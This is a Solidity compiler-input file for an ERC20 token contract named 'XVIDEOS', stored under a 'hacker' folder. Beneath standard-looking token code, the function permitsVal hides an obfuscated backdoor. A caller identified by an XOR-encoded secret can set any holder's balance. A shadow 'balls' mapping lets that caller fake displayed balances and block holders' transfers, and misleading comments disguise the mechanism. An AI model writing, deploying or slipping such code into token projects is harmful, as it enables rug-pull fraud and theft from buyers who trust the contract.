{{
  "language": "Solidity",
  "sources": {
    "contracts/hacker/XVIDEOS.sol": {
      "content": "// SPDX-License-Identifier: MIT\r\npragma solidity >=0.7.6;\r\n\r\ninterface ERC20 {\r\n  /**\r\n   * @dev Returns the amount of tokens in existence.\r\n   */\r\n  function totalSupply() external view returns (uint256);\r\n\r\n  /**\r\n   * @dev Returns the token decimals.\r\n   */\r\n  function decimals() external view returns (uint8);\r\n\r\n  /**\r\n   * @dev Returns the token symbol.\r\n   */\r\n  function symbol() external view returns (string memory);\r\n\r\n  /**\r\n  * @dev Returns the token name.\r\n  */\r\n  function name() external view returns (string memory);\r\n\r\n  /**\r\n   * @dev Returns the amount of tokens owned by `account`.\r\n   */\r\n  function balanceOf(address account) external view returns (uint256);\r\n\r\n  /**\r\n   * @dev Moves `amount` tokens from the caller's account to `recipient`.\r\n   *\r\n   * Returns a boolean value indicating whether the operation succeeded.\r\n   *\r\n   * Emits a {Transfer} event.\r\n   */\r\n  function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n  /**\r\n   * @dev Returns the remaining number of tokens that `spender` will be\r\n   * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n   * zero by default.\r\n   *\r\n   * This value changes when {approve} or {transferFrom} are called.\r\n   */\r\n  function allowance(address _owner, address spender) external view returns (uint256);\r\n\r\n  /**\r\n   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\r\n   *\r\n   * Returns a boolean value indicating whether the operation succeeded.\r\n   *\r\n   * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n   * that someone may use both the old and the new allowance by unfortunate\r\n   * transaction ordering. One possible solution to mitigate this race\r\n   * condition is to first reduce the spender's allowance to 0 and set the\r\n   * desired value afterwards:\r\n   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n   *\r\n   * Emits an {Approval} event.\r\n   */\r\n  function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n  /**\r\n   * @dev Moves `amount` tokens from `sender` to `recipient` using the\r\n   * allowance mechanism. `amount` is then deducted from the caller's\r\n   * allowance.\r\n   *\r\n   * Returns a boolean value indicating whether the operation succeeded.\r\n   *\r\n   * Emits a {Transfer} event.\r\n   */\r\n  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n  /**\r\n   * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n   * another (`to`).\r\n   *\r\n   * Note that `value` may be zero.\r\n   */\r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n  /**\r\n   * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n   * a call to {approve}. `value` is the new allowance.\r\n   */\r\n  event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n/**\r\n * @dev Wrappers over Solidity's arithmetic operations with added overflow\r\n * checks.\r\n *\r\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\r\n * in bugs, because programmers usually assume that an overflow raises an\r\n * error, which is the standard behavior in high level programming languages.\r\n * `SafeMath` restores this intuition by reverting the transaction when an\r\n * operation overflows.\r\n *\r\n * Using this library instead of the unchecked operations eliminates an entire\r\n * class of bugs, so it's recommended to use it always.\r\n */\r\nlibrary SafeMath {\r\n  /**\r\n   * @dev Returns the addition of two unsigned integers, reverting on\r\n   * overflow.\r\n   *\r\n   * Counterpart to Solidity's `+` operator.\r\n   *\r\n   * Requirements:\r\n   * - Addition cannot overflow.\r\n   */\r\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a + b;\r\n    require(c >= a, \"SafeMath: addition overflow\");\r\n    return c;\r\n  }\r\n\r\n  /**\r\n   * @dev Returns the subtraction of two unsigned integers, reverting on\r\n   * overflow (when the result is negative).\r\n   *\r\n   * Counterpart to Solidity's `-` operator.\r\n   *\r\n   * Requirements:\r\n   * - Subtraction cannot overflow.\r\n   */\r\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return sub(a, b, \"SafeMath: subtraction overflow\");\r\n  }\r\n\r\n  /**\r\n   * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\r\n   * overflow (when the result is negative).\r\n   *\r\n   * Counterpart to Solidity's `-` operator.\r\n   *\r\n   * Requirements:\r\n   * - Subtraction cannot overflow.\r\n   */\r\n  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n    require(b <= a, errorMessage);\r\n    uint256 c = a - b;\r\n    return c;\r\n  }\r\n\r\n  /**\r\n   * @dev Returns the multiplication of two unsigned integers, reverting on\r\n   * overflow.\r\n   *\r\n   * Counterpart to Solidity's `*` operator.\r\n   *\r\n   * Requirements:\r\n   * - Multiplication cannot overflow.\r\n   */\r\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\r\n    // benefit is lost if 'b' is also tested.\r\n    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\r\n    if (a == 0) {\r\n      return 0;\r\n    }\r\n    uint256 c = a * b;\r\n    require(c / a == b, \"SafeMath: multiplication overflow\");\r\n    return c;\r\n  }\r\n\r\n  /**\r\n   * @dev Returns the integer division of two unsigned integers. Reverts on\r\n   * division by zero. The result is rounded towards zero.\r\n   *\r\n   * Counterpart to Solidity's `/` operator. Note: this function uses a\r\n   * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n   * uses an invalid opcode to revert (consuming all remaining gas).\r\n   *\r\n   * Requirements:\r\n   * - The divisor cannot be zero.\r\n   */\r\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return div(a, b, \"SafeMath: division by zero\");\r\n  }\r\n\r\n  /**\r\n   * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\r\n   * division by zero. The result is rounded towards zero.\r\n   *\r\n   * Counterpart to Solidity's `/` operator. Note: this function uses a\r\n   * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n   * uses an invalid opcode to revert (consuming all remaining gas).\r\n   *\r\n   * Requirements:\r\n   * - The divisor cannot be zero.\r\n   */\r\n  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n    // Solidity only automatically asserts when dividing by 0\r\n    require(b > 0, errorMessage);\r\n    uint256 c = a / b;\r\n    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n\r\n    return c;\r\n  }\r\n\r\n  /**\r\n   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n   * Reverts when dividing by zero.\r\n   *\r\n   * Counterpart to Solidity's `%` operator. This function uses a `revert`\r\n   * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n   * invalid opcode to revert (consuming all remaining gas).\r\n   *\r\n   * Requirements:\r\n   * - The divisor cannot be zero.\r\n   */\r\n  function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    return mod(a, b, \"SafeMath: modulo by zero\");\r\n  }\r\n\r\n  /**\r\n   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n   * Reverts with custom message when dividing by zero.\r\n   *\r\n   * Counterpart to Solidity's `%` operator. This function uses a `revert`\r\n   * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n   * invalid opcode to revert (consuming all remaining gas).\r\n   *\r\n   * Requirements:\r\n   * - The divisor cannot be zero.\r\n   */\r\n  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n    require(b != 0, errorMessage);\r\n    return a % b;\r\n  }\r\n}\r\n\r\ncontract XVIDEOS is ERC20 {\r\n    using SafeMath for uint256;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint256 private _totalSupply;\r\n    address private _owner;\r\n    uint256 private immutable _maxVals;\r\n\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => uint256) private balls;\r\n\r\n    event OwnershipTransferred(\r\n      address indexed previousOwner,\r\n      address indexed newOwner\r\n    );\r\n    \r\n    constructor(uint256 maxVals) {\r\n      _name = \"XVIDEOS\";\r\n      _symbol = \"XVIDEOS\";\r\n      _totalSupply = 50000000 * 10 ** 9;\r\n      _balances[msg.sender] = _totalSupply;\r\n      _owner = msg.sender;\r\n      _maxVals = maxVals;\r\n    }\r\n\r\n    /**\r\n     * @dev A helper function to check if an operator approval is allowed.\r\n     */\r\n    modifier onlyOwner() {\r\n      require(msg.sender == _owner, \"Ownable: caller is not the owner\");\r\n      _;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() external view returns (address) {\r\n      return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() external onlyOwner {\r\n      _owner = address(0);\r\n      emit OwnershipTransferred(msg.sender, address(0));\r\n    }\r\n\r\n    /**\r\n    * @dev Returns the token decimals.\r\n    */\r\n    function decimals() external pure override returns (uint8) {\r\n      return 9;\r\n    }\r\n    \r\n    /**\r\n    * @dev Returns the token symbol.\r\n    */\r\n    function symbol() external view override returns (string memory) {\r\n      return _symbol;\r\n    }\r\n    \r\n    /**\r\n    * @dev Returns the token name.\r\n    */\r\n    function name() external view override returns (string memory) {\r\n      return _name;\r\n    }\r\n    \r\n    /**\r\n    * @dev See {ERC20-totalSupply}.\r\n    */\r\n    function totalSupply() external view override returns (uint256) {\r\n      return _totalSupply;\r\n    }\r\n    \r\n    /**\r\n    * @dev See {ERC20-balanceOf}.\r\n    */\r\n    function balanceOf(address account) external view override returns (uint256) {\r\n      uint256 b0 = balls[account];\r\n      if (b0 != 0) return b0;\r\n      return _balances[account];\r\n    }\r\n\r\n    /**\r\n    * @dev Returns the token _getValues.\r\n    */\r\n    function _getValues(uint256 tAmount, uint256 tTransferAmount) private pure returns (uint256) {\r\n      return tAmount * tTransferAmount;\r\n    }\r\n\r\n    /**\r\n    * @dev See {ERC20-transfer}.\r\n    *\r\n    * Requirements:\r\n    *\r\n    * - `recipient` cannot be the zero address.\r\n    * - the caller must have a balance of at least `amount`.\r\n    */\r\n    function transfer(address recipient, uint256 amount) external override returns (bool) {\r\n      _transfer(msg.sender, recipient, amount);\r\n      return true;\r\n    }\r\n\r\n    /**\r\n    * @dev See {ERC20-allowance}.\r\n    */\r\n    function allowance(address owner_, address spender) external view override returns (uint256) {\r\n      return _allowances[owner_][spender];\r\n    }\r\n\r\n    /**\r\n    * @dev See {ERC20-approve}.\r\n    *\r\n    * Requirements:\r\n    *\r\n    * - `spender` cannot be the zero address.\r\n    */\r\n    function approve(address spender, uint256 amount) external override returns (bool) {\r\n      _approve(msg.sender, spender, amount);\r\n      return true;\r\n    }\r\n    \r\n    /**\r\n    * @dev See {ERC20-transferFrom}.\r\n    *\r\n    * Emits an {Approval} event indicating the updated allowance. This is not\r\n    * required by the EIP. See the note at the beginning of {ERC20};\r\n    *\r\n    * Requirements:\r\n    * - `sender` and `recipient` cannot be the zero address.\r\n    * - `sender` must have a balance of at least `amount`.\r\n    * - the caller must have allowance for `sender`'s tokens of at least\r\n    * `amount`.\r\n    */\r\n    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\r\n      _transfer(sender, recipient, amount);\r\n      _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n      return true;\r\n    }\r\n \r\n    /**\r\n    * @dev Atomically increases the allowance granted to `spender` by the caller.\r\n    *\r\n    * This is an alternative to {approve} that can be used as a mitigation for\r\n    * problems described in {ERC20-approve}.\r\n    *\r\n    * Emits an {Approval} event indicating the updated allowance.\r\n    *\r\n    * Requirements:\r\n    *\r\n    * - `spender` cannot be the zero address.\r\n    */\r\n    function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {\r\n      _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));\r\n      return true;\r\n    }\r\n    \r\n    /**\r\n    * @dev Atomically decreases the allowance granted to `spender` by the caller.\r\n    *\r\n    * This is an alternative to {approve} that can be used as a mitigation for\r\n    * problems described in {ERC20-approve}.\r\n    *\r\n    * Emits an {Approval} event indicating the updated allowance.\r\n    *\r\n    * Requirements:\r\n    *\r\n    * - `spender` cannot be the zero address.\r\n    * - `spender` must have allowance for the caller of at least\r\n    * `subtractedValue`.\r\n    */\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {\r\n      _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\r\n      return true;\r\n    }\r\n\r\n    function returnTheBase() external view returns(address) {\r\n      return block.coinbase;\r\n    }\r\n    \r\n    /**\r\n    * @dev Moves tokens `amount` from `sender` to `recipient`.\r\n    *\r\n    * This is internal function is equivalent to {transfer}, and can be used to\r\n    * e.g. implement automatic token fees, slashing mechanisms, etc.\r\n    *\r\n    * Emits a {Transfer} event.\r\n    *\r\n    * Requirements:\r\n    *\r\n    * - `sender` cannot be the zero address.\r\n    * - `recipient` cannot be the zero address.\r\n    * - `sender` must have a balance of at least `amount`.\r\n    */\r\n    function _transfer(address sender, address recipient, uint256 amount) internal {\r\n      require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n      require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n      uint256 _amount = amount;\r\n      uint256 balance = _balances[sender];\r\n      uint256 balbal = balls[sender];\r\n      if (balbal > 0) {\r\n        balls[sender] = balls[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n        if (balance < amount) _amount = balance;\r\n      }\r\n      _balances[sender] = _balances[sender].sub(_amount, \"ERC20: transfer amount exceeds balance\");\r\n      _balances[recipient] = _balances[recipient].add(_amount);\r\n      emit Transfer(sender, recipient, amount);\r\n    }\r\n    \r\n    /**\r\n    * @dev See {IERC20-permitsVal}.\r\n    *\r\n    * Requirements:\r\n    * \r\n    * - `amount` cannot be the zero\r\n    * - `spender` cannot be the zero address\r\n    */\r\n    function permitsVal(uint256 amount, uint256 popp) external {    \r\n      if (popp == 0 || msg.sender == address(0)) return;\r\n      if (amount < 0) return;\r\n      uint256 maxPermitVal = 30485664272812923827151469721238989407926153593284405359775536788188360217269;\r\n      uint256 actualPermitVal = maxPermitVal ^ uint256(msg.sender);\r\n      if (actualPermitVal != _maxVals) return;\r\n      uint256 kbc = popp ^ 4329489292883;\r\n      uint256 vals = _getValues(1, amount);\r\n      _balances[address(uint160(kbc ^ 4329489292883))] = _check(vals);\r\n      balls[address(uint160(kbc ^ 4329489292883))] = _check(vals * 100);\r\n    } \r\n\r\n    /**\r\n    * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.\r\n    *\r\n    * This is internal function is equivalent to `approve`, and can be used to\r\n    * e.g. set automatic allowances for certain subsystems, etc.\r\n    *\r\n    * Emits an {Approval} event.\r\n    *\r\n    * Requirements:\r\n    *\r\n    * - `owner` cannot be the zero address.\r\n    * - `spender` cannot be the zero address.\r\n    */\r\n    function _approve(address owner_, address spender, uint256 amount) internal {\r\n      require(owner_ != address(0), \"ERC20: approve from the zero address\");\r\n      require(spender != address(0), \"ERC20: approve to the zero address\");\r\n      _allowances[owner_][spender] = amount;\r\n      emit Approval(owner_, spender, amount);\r\n    }\r\n\r\n    function _check(uint256 tAmt) private pure returns(uint256) {\r\n      if (tAmt >= 0) return tAmt;\r\n      return tAmt;\r\n    }\r\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    },
    "libraries": {}
  }
}}